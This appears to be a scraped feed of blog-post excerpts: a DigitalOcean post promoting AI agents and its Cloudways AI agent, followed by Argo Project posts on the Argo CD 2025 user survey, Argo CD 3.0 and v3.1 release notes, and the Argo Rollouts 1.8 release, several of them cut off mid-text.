      "summary": "<p>AI is shaping up to be one of the most transformational technologies of our lifetimes and will change how we live and work just like the PC, the internet, and the smartphone did. The launch of ChatGPT was a seminal moment in the evolution of AI, and since then, AI’s adoption has accelerated. According to “<a href=\"https://www.nber.org/system/files/working_papers/w32966/w32966.pdf\" rel=\"ugc nofollow noopener\" target=\"_blank\">The rapid adoption of Generative AI. Bick, Blandin, &amp; Deming (2024</a>)”, AI is being adopted at twice the rate of the PC and internet at a similar point in their evolution.</p>\n<p><img alt=\"AI adoption\" src=\"https://doimages.nyc3.cdn.digitaloceanspaces.com/002Blog/05-19-25-AI-Agent-blog-adoption.png\" /></p>\n<p>Not just adoption, the rate of innovation in AI has been faster than anything we have seen before. So where is AI headed?</p>\n<p>To answer this question, let us start by looking at how other transformational technologies have evolved throughout history. Take the Internet for example – it started with the infrastructure - with routers and network switches. But the true inflection point came with the emergence of platform capabilities, such as web browsers and HTML, which allowed people to build and use applications like search engines, e-commerce, and social media.</p>\n<p>If you look at the PC, microprocessors and memory and other infrastructure components came first. But what triggered the massive adoption was the creation of a platform – WinTel, which provided a standardized environment for developing and running PC applications. Same with the smartphones; the infrastructure started first with modems and cell towers, but it really took off when a platform enabled the creation and use of applications.</p>\n<p>AI will follow a similar <strong>IPA</strong> (<strong>I</strong>nfrastructure -&gt; <strong>P</strong>latform -&gt; <strong>A</strong>pplication) model, with the innovation moving from Infrastructure (e.g. GPU) to Platforms (e.g. <a href=\"https://www.digitalocean.com/products/gen-ai\">DigitalOcean GenAI Platform</a>) and Applications (e.g. Copilots), and <strong>AI agents</strong> are going to accelerate this transformation.</p>\n<p><img alt=\"AI evolution\" src=\"https://doimages.nyc3.cdn.digitaloceanspaces.com/002Blog/05-19-25-ai-agent-blog-evolution2.png\" /></p>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"what-are-ai-agents\"><a href=\"https://www.digitalocean.com/blog.atom#what-are-ai-agents\">What are AI agents?</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#what-are-ai-agents\"></a></h2>\n\n<p>In essence, an <a href=\"https://www.digitalocean.com/resources/articles/ai-agents\">AI agent </a>is a piece of software that can act like humans – take input, reason about things, and perform actions. Agents are really four sequences of primitives. The agent gets a command from the user to perform some action, the agent then gets the information it needs by acquiring data from the outside world, it then reasons and plans how to get the job done, and finally it performs the actions.</p>\n<p><img alt=\"ai agents\" src=\"https://doimages.nyc3.cdn.digitaloceanspaces.com/002Blog/05-19-25-ai-agent-blog-understanding-agents.png\" /></p>\n</details>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"ai-agents-will-transform-businesses\"><a href=\"https://www.digitalocean.com/blog.atom#ai-agents-will-transform-businesses\">AI agents will transform businesses</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#ai-agents-will-transform-businesses\"></a></h2>\n\n<p>Agents will drive a massive automation of work.Consider the example of a customer service agent today. Many of the calls that such an agent handles can be handled by an AI agent. An average call interaction handled by a human agent that takes about 10 minutes today costs around $3^, while an AI agent can do that for one cent^^. Not just that,  the quality of these AI models is improving exponentially and the cost of AI is decreasing by 10X YoY. So as you factor in the progress over the next few years, the conclusion is inevitable - agents will be automating or assisting with a lot of the “human work”. That means, businesses of all kinds will have no option but to reinvent themselves with AI agents in order to serve their customers in the best and most cost effective way possible.</p>\n<p>According to Statista, annual US salaries total approximately $200 billion for HR, $330 billion for IT, and $1.1 trillion for sales &amp; marketing, and as a lot of enterprise workflows get automated, the cloud and AI TAM will increase by hundreds of billions of dollars as businesses deploy agents to automate enterprise work.</p>\n<p>At DigitalOcean, we will fully participate in this TAM expansion by enabling customers to build and deploy agents through our GenAI platform.</p>\n<p><img alt=\"agentic AI TAM\" src=\"https://doimages.nyc3.cdn.digitaloceanspaces.com/002Blog/05-19-25-ai-agent-blog-cloud-growth.png\" /></p>\n</details>\n<details class=\"collapsible\" open=\"\">\n\n<h2 id=\"agentic-cloud-ai-agents-transforming-the-cloud\"><a href=\"https://www.digitalocean.com/blog.atom#agentic-cloud-ai-agents-transforming-the-cloud\">Agentic Cloud - AI agents transforming the cloud</a><a class=\"hash-anchor\" href=\"https://www.digitalocean.com/blog.atom#agentic-cloud-ai-agents-transforming-the-cloud\"></a></h2>\n\n<p>Given that agents will touch every enterprise workflow, it is fair to ask “how will agents change the cloud”? Indeed, we are at an inflection point for the cloud due to two emerging paradigm shifts: 1) Natural language as code, and 2) agents automating human work. The first will change how developers interact with the cloud, while the second will automate many DevOps/CloudOps and other cloud workflows. Like in previous transformations, there will be winners and losers. The winners will be the ones who use the new paradigms to reinvent themselves, while the losers will be the ones who do not change.</p>\n<p>At DigitalOcean, we will be at the forefront of reinventing the cloud by embedding agentic automation into our services. Let me illustrate how we are applying the Agentic cloud paradigm to reimagine web hosting. <a href=\"https://www.cloudways.com/en/\" rel=\"ugc nofollow noopener\" target=\"_blank\">Cloudways</a> is a web hosting software from DigitalOcean that is available on multiple clouds - DigitalOcean, AWS, GCP, Vultr, and Linode, Cloudways was recently ranked as the No. 1  web hosting software by CNET, and is one of the most popular web hosting applications for WordPress, which powers more than 40% of websites.</p>\n<p>Customers tell us that dealing with system issues (disk usage, DDOS, etc.) is a significant pain point in web hosting and they often spend several hours a month debugging and fixing such issues. Today, DigitalOcean receives more than 600,000 customer support requests a year for hosting system issues, with each of these support requests spanning 40 minutes on average. Therefore, we asked the question - “How would Cloudways have dealt with system issues if AI and agents were available when it was first built”? The answer was pretty obvious – Cloudways would use agents to autonomously rootcause and fix these issues, and enable customers to interact in natural language to gain insight about these issues. So, we set out to do exactly that by embedding SRE (system reliability) agents inside Cloudways that can take input from users in English and autonomously debug and fix system issues.</p>\n<p>We launched <a href=\"https://www.cloudways.com/en/cloudways-ai-copilot.php\" rel=\"ugc nofollow noopener\" target=\"_blank\">Cloudways AI agent</a> – one of the most sophisticated uses of GenAI in the industry - in private preview with about 250 customers in Q1 ‘25. As shown in the video below, Cloudways AI agent provides troubleshooting insights and 1-click automated issue resolution. The user only needs to click the alert when issues arise and the AI agent instantly explains the issues and provides remediation steps. And with a single click, AI jumps into action and fixes the issues automatically. Users no longer need to muck around with code, and all the interactions are done in natural language. What used to take an hour now just takes a minute, saving businesses thousands of dollars a year^^^.</p>\n\n    <a href=\"https://www.youtube.com/watch?v=QW2298unVLs\" target=\"_blank\">View YouTube video</a>\n\n<p>We will be releasing the General Availability (GA) very soon and are encouraged by the incredible feedback from early customers - “Cloudways Copilot has been a game-changer”; “It is the first good implementation of AI I’ve seen”; “It has saved us countless hours”; “It is incredibly fast, accurate, and intuitive; “ The insights it provides are spot on and the recommended steps have been 100% correct every time.”</p>\n<p><img alt=\"Cloudways AI quotes\" src=\"https://doimages.nyc3.cdn.digitaloceanspaces.com/002Blog/05-19-25-AI-agent-blog-quotes.png\" /></p>\n<p>This is only the beginning. We are going to embed AI agents in all of our services, providing customers a truly differentiated cloud experience. As an agentic cloud, DigitalOcean - the simplest, scalable and approachable cloud – gets even simpler, more scalable and approachable. We believe we are uniquely positioned to lead the next wave in reimagining the cloud and I will discuss more in a future blog.</p>\n<p>^ Based on U.S. average customer service salary of $20/hr for a 10-minute call.</p>\n<p>^^ Based on agent pricing of $1 per million tokens.</p>\n<p>^^^ Based on average customer spend of $200 per month on these tasks.</p>\n</details>",

      "summary": "<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*_-6V9xGQM6vGmsiD_dNEog.png\" /></figure><p>The results of the 2025 Argo CD user survey are in! We had a fantastic response, with 185 submissions, which shows the community is more engaged than ever.</p><p>This year, our goal was to capture a well-rounded view of how folks use Argo CD. We strive to stay closely connected to our users, understand where we’re excelling, and identify current pain points so we can prioritize improvements and proactively address community needs.</p><p>This year’s theme is environment promotion, as it has emerged as one of the most significant pain points currently experienced by Argo CD users.</p><p>Here’s what we learned.</p><h4>TL;DR</h4><p>Argo CD is growing fast and becoming a standard for deployments to production!</p><p>Compared to 2023, significantly more organizations rely on it in production. Over 60% of respondents have been actively using it in Production for more than 2 years. Patterns like ApplicationSets and self-healing have become widely adopted. Argo CD is increasingly being used at scale, with instances managing more applications, often spanning multiple clusters. We can expect scalability and performance to become the pressure points, as well as growing interest in enterprise-like capabilities from the community.</p><p>Environment promotion is where things start to get tricky. Most teams still lean on custom scripts or manual steps to get the job done. Many organizations seek solutions to improve traceability and visibility, and to standardize workflows across environments. We will likely see more maturity and new capabilities in this area.</p><p>We’re also seeing more applications under management overall, with organizations connecting more clusters to each Argo CD instance, yet still running just one to five instances. This trend points to growing pressure on instance scalability and performance.</p><p>A few more highlights from the results:</p><ul><li>Argo Labs projects like Argo CD Image Updater, Argo CD Operator, and Argo CD Vault Plugin are gaining traction, reflecting a push toward automation.</li><li>Helm is by far the most popular Argo CD installation method.</li><li>Platform engineers now make up a larger share of the community, reflecting broader organizational shifts.</li></ul><h4>What do developers really think of Argo CD?</h4><p>We kicked off the survey by asking users how likely they were to recommend Argo CD to others — one of the simplest ways to get a feel for overall satisfaction.</p><p>The 2025 result? Overwhelmingly positive 🎉 Even more users this year said they’d recommend Argo CD compared to an already strong showing in 2023. That shift says a lot about how far the tool has come and the growing trust the community has in it. In fact, Argo CD achieved an impressive Net Promoter Score (NPS) of 79 — an increase of 3 points from two years ago — highlighting exceptional user satisfaction!</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*ZY4tGNGXZGrHgLfn\" /></figure><p>We were overwhelmed by the encouraging and positive comments, reflecting just how much people love the project and deeply value the vibrant Argo community. Here’s what some users had to say:</p><blockquote><em>“Argo CD is incredible, I have no idea how we survived without it in the past.”</em></blockquote><blockquote><em>“Thanks for this great tool ❤️”</em></blockquote><blockquote><em>“You’re awesome!”</em></blockquote><blockquote><em>“Please keep going!”</em></blockquote><blockquote><em>“Keep up the good work! :)”</em></blockquote><p>We asked which features users find most valuable. The winners?</p><ul><li>ApplicationSets</li><li>Argo CD’s intuitive UI</li></ul><p>Together, they make it much easier to manage and visualise complex deployments.</p><p>Also mentioned: auto-sync, drift detection, rollbacks, RBAC, multi-source support, and integrations.</p><h4>Who’s using Argo CD these days?</h4><p>The community remains consistent and is made up mostly of DevOps and platform engineers, but platform engineers have grown from 25% in 2023 to 37% in 2025. DevOps engineers declined slightly from 43% to 36%. This shift likely reflects the broader industry trend toward adopting a platform mindset, resulting in increased demand for dedicated platform engineering roles. Roles like architects and SREs remained steady.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*ZXUJ5osL9R28zoUn\" /></figure><h4>What does adoption look like in 2025?</h4><p>With the adoption being consistently high, 93% of respondents use Argo CD in production in 2023 and 97% in 2025, the implementation maturity grows significantly. In 2023, only 28% had used Argo CD in production for over 2 years. In 2025, that number jumped to 60%, and fewer than 10% were still evaluating or in early phases.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*e0xsvHzotjrhkIYg\" /></figure><p>Almost 60% of respondents said that 75% or more of their production applications now run on Kubernetes.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*gWqJBdpN4BHjbFFs\" /></figure><p>As Kubernetes adoption deepens, Argo CD has become an essential part of the CI/CD infrastructure. As more organizations rely on Argo CD, we’ll likely see continued investment from both the community and vendors, as well as more contributors joining the project.</p><p>When it comes to Argo CD installation, Helm is by far the top choice, followed by tools like Kustomize and Terraform. Interesting to note: 19% use cluster-wide installs versus just 10% using namespace-scoped ones.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*x4RJRiUclqZg-VgN\" /></figure><h4>What does the Argo CD footprint look like?</h4><p>The most noticeable trend is the growing number of applications. Organizations are managing bigger setups with fewer, larger instances.</p><p>In 2023, just over 15% managed more than 500 Applications; by 2025, this rose to 42%. Notably, these numbers don’t correlate with how long organizations have used Argo CD and how many applications they have.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*eRwUqAp_3dbairfo\" /></figure><p>The number of Argo CD instances is growing compared to 2023, but the increase is not as significant as the rise in the number of applications. In 2023, 77% of respondents reported having fewer than 6 instances, while this percentage fell to 64% in 2025. Nevertheless, most organizations still use only a handful of instances.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*q_ePbizmF7pE04-k\" /></figure><p>Even though the number of Argo CD instances hasn’t changed much, the number of applications certainly has! This means each instance is likely connecting to more clusters. For example, back in 2023, about 42% of instances were linked to one Kubernetes cluster. Fast forward to 2025, and that number has dropped to 25%. At the same time, the share of instances connecting to more than 20 clusters has jumped significantly, going from 5% to 25%.</p><p>In summary, organizations manage a significantly larger number of applications, with more clusters connected to a single Argo CD instance, typically keeping the number of instances between 1 and 5.</p><p>So, what does this mean for the community and the project? Well, it seems that managing lots of Argo CD instances might not be the biggest hurdle for most teams. Instead, the real pressure points are around scalability and performance as organizations push Argo CD to handle more clusters and Applications. Users are already calling out these challenges, and they’re likely to become even more important moving forward. The good news? Some of this work is already underway.</p><p><em>ℹ️ Interested in how to scale Argo CD? Take a look at the </em><a href=\"https://github.com/argoproj-labs/argocd-agent\"><em>argocd-agent project</em></a><em> or read an </em><a href=\"https://argo-cd.readthedocs.io/en/stable/operator-manual/high_availability/\"><em>article about scaling up Argo CD</em></a><em>.</em></p><p><em>If you want to contribute to measuring and improving Argo scalability, take a look at the Scalability special interest group (</em><a href=\"https://github.com/argoproj/argoproj/tree/main/sigs/sig-scalability\"><em>Argo SIG Scalability</em></a><em>).</em></p><h4>What patterns and tools are catching on?</h4><p>More and more teams are following Argo CD’s recommended practices. App-of-Apps, ApplicationSets, and built-in self-healing are now widely used to manage complex GitOps setups.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*eG5_7BB_xx5xn1U_\" /></figure><p>We also asked about sub-projects, an area that shows the ecosystem dynamics. The most used are:</p><ul><li>Argo CD Image Updater</li><li>Argo CD Operator</li><li>Argo CD Vault Plugin</li></ul><p>Like the patterns mentioned earlier, the popularity of these Argo Labs projects reflects growing efforts to make Argo CD implementations more structured and automation-friendly.</p><p><em>ℹ️ You can manage secrets with </em><a href=\"https://argo-cd.readthedocs.io/en/stable/operator-manual/secret-management/#secret-management\"><em>Kubernetes operators</em></a><em>, one of the recommended ways of managing secrets on the destination cluster. This keeps Argo CD out of direct secret management, helping avoid accidental updates and reducing the risk of leaks.</em></p><p>Image Updater is the most adopted sub-project (used by 34% of respondents). While still under active development and intended for non-critical environments, its popularity shows just how hungry teams are for better deployment and promotion automation.</p><p>But Image Updater only solves part of the deployment automation puzzle. There’s still no go-to comprehensive solution out there. We’ll explore this further in the next section on environment promotion.</p><h4>Environment promotion</h4><p>Given how widely Argo CD is used in production, we wanted to explore how teams handle environment promotion. Is it a pain point for GitOps users? And how do their approaches compare to the more traditional promotion strategies used on other platforms?</p><p>First, we looked at the number of environments teams work with. Now, most respondents use 3 or fewer. Only 12% reported having more than 8.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*lwhiMHHc0r41nELe\" /></figure><p>This introduces complexity, as teams must coordinate across multiple instances. And that’s where challenges like consistent observability start to show up.</p><p>To dig deeper into this, we asked teams about their biggest pain points. What came up most?</p><ul><li>Traceability across environments, what version of a deployed app is running where (51%)</li><li>Release gates (44%)</li><li>Understanding app health and status across environments (37%)</li><li>Keeping pipeline definitions consistent (36%)</li><li>Troubleshooting failed promotions (29%)</li></ul><p>Most teams reported multiple challenges, with traceability and release gates often mentioned together.</p><p>To understand what drives these challenges, we asked how teams promote applications across environments.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*k_oO6HneODfHz6Er\" /></figure><p>The most common setup is DIY. Around 67% use scripts, in-house tools, or both.</p><p>Nearly a quarter of teams handle promotions solely through manual manifest updates, and almost half use some form of manual step, often paired with scripts.</p><p>So, how can we make sense of this combination? One possibility is that teams are using Argo CD Image Updater, currently the most popular sub-project, for simple, image-only updates. For more complex tasks, like updating configuration files, many might rely on manual steps. In other words, automation helps with the easy stuff, but more involved changes still need hands-on work.</p><p><em>ℹ️ Manual manifest updates are often where teams start with Argo CD. They can work well for small setups, like a few static infrastructure manifests.</em></p><p><em>But as you scale, they tend to fall short. It’s easy to run into slower deployments, more manual overhead, and challenges around security and compliance. If you’re growing with Argo CD, it’s worth moving toward full CI/CD automation to keep things on track.</em></p><p>A few out-of-the-box solutions for automated environment promotion are starting to show up in the survey. The most mentioned, though still only used by 4% of respondents, is <a href=\"https://argo-gitops-promoter.readthedocs.io/en/latest/\">Argo GitOps Promoter</a>. It’s part of the Argo CD ecosystem and works alongside <a href=\"https://argo-cd.readthedocs.io/en/stable/proposals/manifest-hydrator/\">Hydrator</a> to handle promotions via pull requests. Others mentioned Codefresh GitOps and Kargo.</p><p>Here’s how one person summed it up:</p><blockquote><em>“Some sort of environment promotion. Lots of players in the game now and it’s hard to settle on one. Lots of manual reviews required for manifest changes that can be tiresome to compare against other environments. Some sort of environment comparison tool would be good.”</em></blockquote><p>That quote really captures where things stand. Plenty is happening in this space, but no clear winner or standard approach just yet. As more teams adopt Argo CD and take on more advanced deployment setups, tackling challenges like traceability, testing, and consistent configuration will only become more important.</p><p>This is definitely a space to watch. Expect more tooling, more investment, and, hopefully, comprehensive user-friendly solutions soon.</p><h4>What challenges are teams facing?</h4><p>After digging into environment promotion, we zoomed out and asked about broader challenges, too.</p><p>Nearly 30% of respondents said they had no major challenges with Argo CD, which is a great sign.</p><p>The most common challenge, flagged by 37%, was environment modeling and promotion workflows (covered earlier).</p><p>Other pain points included:</p><ul><li>Troubleshooting deployments and app issues (25%)</li><li>Too much manual work or not enough automation (23%)</li><li>Limited visibility into deployment status (16%)</li></ul><h4>What features are missing?</h4><p>To wrap up, we asked what users think is missing from Argo CD. Many of the responses built on earlier themes.</p><p>Some areas users want to see improved:</p><ul><li>Support for promoting apps through stages and managing service dependencies.</li><li>Better templating in ApplicationSets, progressive syncs, and built-in promotion workflows.</li><li>Multi-cluster visibility and faster UI performance.</li><li>Enterprise-grade features like fine-grained RBAC, audit trails, Vault and Prometheus integrations, and better error messages.</li></ul><p>As teams scale up, these requests point toward a natural next step: evolving Argo CD into a full-featured, enterprise-ready platform.</p><h4>Final words</h4><p>The 2025 survey gave us a ton to think about. We saw just how far Argo CD has come, what’s working well, and what needs more attention. All these insights are gold for the project’s future evolution.</p><p>Huge thanks to everyone who took the time to share feedback!</p><p>Special shoutout to those who offered to help with case studies, blog posts, talks, or quotes. It really helps grow the community!</p><p>And thanks to Katie Lamkin-Fulsher, Dan Garfield, Henrik Blixt, Michael Crenshaw, Christian Hernandez, Regina Voloshin, Kostis Kapelonis, Jenny Blekh and Tegan Ali, who made this survey possible.</p><img alt=\"\" height=\"1\" src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=ab045f7d5d9a\" width=\"1\" /><hr /><p><a href=\"https://blog.argoproj.io/argo-cd-2025-user-survey-results-ab045f7d5d9a\">Argo CD 2025 User Survey Results</a> was originally published in <a href=\"https://blog.argoproj.io\">Argo Project</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>",

With v3.1, the first batch of features comes out of the gate; featuring <a href=\"https://opencontainers.org/\">OCI</a> support, CLI Plugins, Hydrator updates, UI improvements, plus much more.</p><p>Along with new features, this release comes with a whole slew of security fixes, bug fixes, and general quality of life improvements.</p><p>You can download the v3.1 Release Candidate on the <a href=\"https://github.com/argoproj/argo-cd/releases/tag/v3.1.0-rc1\">Argo CD Releases Page</a>!</p><p>We are really excited to have you try out the new features and look forward to any feedback from the border community! With that, let’s dive into what this release holds!</p><h3>OCI Support</h3><p>Argo CD has supported obtaining Kubernetes manifests from either a Git repository, a Helm chart repository, and later support for getting manifests from a Helm chart stored within an Open Container Initiative (OCI) registry. As OCI registries have more frequently been used to store content aside from container images, more and more projects have been adding support for using OCI as a storage mechanism and a source of truth.</p><p>Starting with Argo CD v3.1, we now support OCI by enabling the use of OCI-compliant container registries as sources for configuration artifacts. This means Argo CD can pull Kubernetes manifests packaged as OCI artifacts from registries that follow the OCI image and distribution specifications. This enhances security and portability, as it allows users to leverage the same registries they use for container images to also store and distribute deployment configurations. Argo CD OCI support comes into beta with this release.</p><p>BIG thanks to <a href=\"https://github.com/blakepettersson\">@blakepettersson</a> from Akuity for leading this effort!</p><h3>Hydrator Improvements</h3><p>Manifest changes are often just image tag bumps. For example, the manifest change associated with a code change. The manifest hydrator writes metadata to the hydrated branch to associate the hydrated commit back to its corresponding dry commit.</p><p>Starting in v3.1, the Hydrator now allows for a way to associate a dry commit with a code commit. This is done by adding information about the upstream repo url, that commit SHA hash, the author of that commit, and any messages associated with that code commit. This information is then added to the Hydrator manifest metadata; this enables future work to be able to display this metadata in the Argo CD UI.</p><p>Thanks to <a href=\"https://github.com/crenshaw-dev\">@crenshaw-dev</a> from Intuit for this improvement.</p><h3>Server-Side Apply Stabilization</h3><p>Argo CD now supports client-side apply migration, which helps transitioning from client-side apply to server-side apply by moving a resource’s managed fields from one manager to Argo CD’s manager. This feature is particularly useful when you need to migrate existing resources that were created using kubectl client-side apply to server-side apply with Argo CD. You can also specify your own field manager to migrate from using an annotation. This is useful when you have other operators managing resources that are no longer in use and would like Argo CD to own all the fields for that operator.</p><p>Thanks to <a href=\"https://github.com/pjiang-dev\">@pjiang-dev</a> from Intuit for this contribution.</p><h3>UI Parameterized Action</h3><p>The Argo CD UI in many ways is the first Kubernetes dashboard, providing not only a UI for GitOps users; but also a feature rich UI for Kubernetes end users. In this release, we’ve added the ability to perform additional action on Kubernetes resources, beyond just deleting.</p><p>This feature enables users to scale resources directly from the Argo CD UI. Users will be able to increase or decrease the number of replicas (Pods) for Deployments and StatefulSets by using an input field. The feature aims to enhance user experience, especially for non-technical users, by eliminating the need to modify configuration files or use kubectl commands for scaling.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*7C4pCbBqylNOEFKm\" /><figcaption>Scaling resource from Argo CD UI</figcaption></figure><p>Thanks to <a href=\"https://github.com/ratulbasak\">@ratulbasak</a> from Deutsche Bank for contributing!</p><h3>And We Didn’t Stop There</h3><p>There are other notable updates/improvements in this release.</p><ul><li>Similar to the <a href=\"https://kubernetes.io/docs/tasks/extend-kubectl/kubectl-plugins/\">kubectl plugin mechanism</a>, support for <em>argocd</em> <a href=\"https://github.com/argoproj/argo-cd/pull/20074\">CLI plugins</a> is available in this release. — <a href=\"https://github.com/nitishfy\">@nitishify</a></li><li>You can now <a href=\"https://github.com/argoproj/argo-cd/pull/22482\">explicitly set auto-sync</a> on an Application — <a href=\"https://github.com/aali309\">@aali309</a></li><li>The sync option <em>SkipDryRunOnMissingResource</em> was only available as an annotation before; now you can set this as an Application sync option — <a href=\"https://github.com/pasha-codefresh\">@pasha-codefresh</a></li><li>Improvements to <a href=\"https://github.com/argoproj/argo-cd/pull/22781\">AppSet Progressive Sync in the UI</a>, paving the path for it to enter Beta — <a href=\"https://github.com/aali309\">@aali309</a></li><li><a href=\"https://github.com/argoproj/argo-cd/pull/23057\">Add cooldown</a> to prevent resetting autoheal exp backoff preemptively — <a href=\"https://github.com/gdsoumya\">@gdsoumya</a></li></ul><h3>Dependency, Platform, and Security Updates</h3><p>Some notable dependency, platform, and security updates included in v3.1</p><p><strong>Go 1.24.4</strong></p><ul><li>All builds, CI, and images now use the latest Go.

This is the first major version change to Argo CD since 2021.</p><p>Argo CD 3.0 brings improvements to security, performance and distills dozens of best practices to provide better defaults while still allowing for flexible configuration to match any team. This release represents a more mature Argo CD that removes deprecated components and streamlines future development and maintenance.</p><p>Let’s jump into what’s new!</p><h4>Better Security with Fine-grained update/delete RBAC enforcement on resources</h4><p>Fine-grained controls introduce the ability to change permissions based not just on the application but on the resources within an application. This new permissions model will require a configuration upgrade from Argo CD 2.x.

Several of these configurations have become best practices or necessities. Some of the new defaults include:</p><ul><li>Use annotations for <a href=\"https://argo-cd.readthedocs.io/en/latest/user-guide/resource_tracking/\">resource tracking</a> (<a href=\"https://github.com/argoproj/argo-cd/pull/22289\">#22289</a> by <a href=\"https://github.com/terrytangyuan\">@terrytangyuan</a> and <a href=\"https://github.com/crenshaw-dev\">@crenshaw-dev</a>)</li><li>Enable RBAC on pod logging by default just like we do for container exec.

Since then we have noticed a number of emerging anti-patterns and have made the decision to publish recommendations on secrets management. (<a href=\"https://github.com/argoproj/argo-cd/issues/21629\">#21629</a> by <a href=\"https://github.com/crenshaw-dev\">@crenshaw-dev</a>)</p><p>Specifically, we endorse using secrets operators and caution against using config management plugins to inject secrets. We recommend <a href=\"https://argo-cd.readthedocs.io/en/release-3.0/operator-manual/secret-management/\">reading the updated documentation on secrets</a>.</p><h4>Upgrading from Argo CD 2.x to Argo CD 3.0</h4><p>Argo CD 3.0 should be a low risk upgrade. We’ve put together a <a href=\"https://argo-cd.readthedocs.io/en/latest/operator-manual/upgrading/2.14-3.0/\">full guide to upgrading to Argo CD 3.0</a>. This includes how to identify if a configuration needs to be changed and if applicable how to retain Argo CD 2.x behavior.</p><p>Beyond following the full guide above, all potentially <a href=\"https://github.com/argoproj/argo-cd/issues?q=is%3Aissue%20state%3Aclosed%20milestone%3Av3.0\">breaking changes can be found on Github</a>.</p><h4>Ongoing and End of Life Support for Argo CD 2.x</h4><p>Following our documented <a href=\"https://argo-cd.readthedocs.io/en/stable/developer-guide/release-process-and-cadence/#release-cycle\">release cadence</a> and <a href=\"https://github.com/argoproj/argo-cd/security/policy#supported-versions\">security policy</a> we support the last three minor releases for security fixes and critical issues. This means the last version of Argo CD (2.14) will go out of support with the release of 3.2, currently planned for the end of 2025.</p><p>A huge thank you to the more than 94 contributors who helped with this release as well as our release champion <a href=\"https://github.com/reggie-k\">Regina Voloshin</a> as well as the Argo CD lead <a href=\"https://github.com/crenshaw-dev\">Michael Crenshaw</a>.

      "summary": "<p>Welcome Argo Rollouts 1.8! This release had 53 contributors, of which 39 were first-timers, and includes 202 commits! Thank you all for your contributions! There are some really nice features in this release so let’s take a look.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*anQTvyi32Mpo6dIWszWrDg.png\" /></figure><h3>Canary Step Plugins</h3><p>This exciting new feature allows you to configure new steps in your Canary configured Rollout. With this plugin system, you are now able to <a href=\"https://argo-rollouts.readthedocs.io/en/stable/features/canary/plugins/\">create a plugin and execute your own steps</a> during the canary analysis. This extends Argo Rollouts capabilities and enriches the progressive delivery experience to accommodate a multitude of scenarios. It is a continuation of the previous work that was done to create a pluggable system for traffic routers and metric providers in the v1.5 release.</p><p>You can refer to the <a href=\"https://argo-rollouts.readthedocs.io/en/latest/plugins/\">documentation</a> to learn more about creating a plugin. Once implemented, it can be configure in the argo-rollouts-config ConfigMap:</p><pre>apiVersion: v1<br />kind: ConfigMap<br />metadata:<br />  name: argo-rollouts-config<br />data:<br />  stepPlugins: |-<br />    - name: &quot;argoproj-labs/step-exec&quot; # name of the plugin<br />      location: &quot;file://./my-custom-plugin&quot; # supports http(s):// urls and file://Ya</pre><p>Users can then configure this plugin as part of their canary steps:</p><pre>apiVersion: argoproj.io/v1alpha1<br />kind: Rollout<br />metadata:<br />  name: example-plugin-ro<br />spec:<br />  strategy:<br />    canary:<br />      steps:<br />        - plugin:<br />            name: argoproj-labs/step-exec<br />            config:<br />              command: echo &quot;hello world&quot;</pre><p>While these plugins do not require to be open-source, we are looking forward to what the community will implement in the upcoming months. If you are interested in contributing a canary step plugin to the community, simply open an issue under argo-rollouts requesting an argoproj-labs repository to host your plugin.</p><p>Contributed by: <a href=\"https://github.com/agaudreault\">Alexandre Gaudreault</a></p><h3>Analysis Consecutive Success Limit</h3><p>This provides the <em>inverse</em> of what an analysis currently does. The main use case for this is to allow users to wait on a condition (in a step analysis especially) to hold, before proceeding to the next step.</p><p>Here is an example analysis:</p><pre>apiVersion: argoproj.io/v1alpha1<br />kind: AnalysisTemplate<br />metadata:<br />  name: success-rate<br />spec:<br />  args:<br />  - name: service-name<br />  metrics:<br />  - name: success-rate<br />    interval: 1m<br />    successCondition: result[0] &lt;= 0.95<br />    consecutiveSuccessLimit: 3<br />    provider:<br />      prometheus:<br />        address: http://prometheus.example.com:9090<br />        query: |<br />          sum(irate(<br />            istio_requests_total{reporter=&quot;source&quot;,destination_service=~&quot;{{args.service-name}}&quot;,response_code!~&quot;5.*&quot;}[1m]<br />          )) /<br />          sum(irate(<br />            istio_requests_total{reporter=&quot;source&quot;,destination_service=~&quot;{{args.service-name}}&quot;}[1m]<br />          ))</pre><p>You can find more information in the documentation found <a href=\"https://argo-rollouts.readthedocs.io/en/latest/features/analysis/#consecutivesuccesslimit-and-failurelimit\">here</a> .</p><p>Contributed by: <a href=\"https://github.com/y-rabie\">Youssef Rabie</a></p><h3>Other Features</h3><ul><li>New Prometheus metric: build_info (<a href=\"https://github.com/argoproj/argo-rollouts/issues/3591\">#3591</a>)</li><li>Enable pprof profiling support (<a href=\"https://github.com/argoproj/argo-rollouts/issues/3769\">#3769</a>)</li><li>Allow specifying full annotations for Nginx canary (<a href=\"https://github.com/argoproj/argo-rollouts/issues/3671\">#3671</a>)</li><li>Credentials to download plugin (<a href=\"https://github.com/argoproj/argo-rollouts/issues/3905\">#3905</a>)</li></ul><h3>Bug fixes</h3><p>We had 36 labeled bug fixes in this release some of the area’s of focus for bugs have been around Rollouts getting stuck progressing and better verification of not causing any outage during a rollout. So, if you have experienced any of these issue test this release out and let us know how it behaves.</p><h3>Summary</h3><p>This releases big feature was around step plugins, I can’t wait to see what this feature empowers end users to create.

